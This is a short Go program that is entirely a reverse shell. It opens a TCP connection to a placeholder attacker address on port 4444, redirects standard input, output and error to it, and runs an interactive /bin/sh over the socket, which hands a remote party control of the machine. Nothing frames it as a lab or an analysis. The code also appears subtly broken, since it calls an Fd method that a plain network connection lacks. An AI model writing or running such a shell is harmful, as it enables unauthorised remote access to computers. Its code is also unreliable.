package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"syscall"
)

func main() {
	// attacker ip and port
	conn, err := net.Dial("tcp", "<attacker_ip>:4444")
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	defer conn.Close()

	// dupli
	syscall.Dup2(int(conn.Fd()), int(os.Stdin.Fd()))
	syscall.Dup2(int(conn.Fd()), int(os.Stdout.Fd()))
	syscall.Dup2(int(conn.Fd()), int(os.Stderr.Fd()))

	// shell
	cmd := exec.Command("/bin/sh", "-i")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
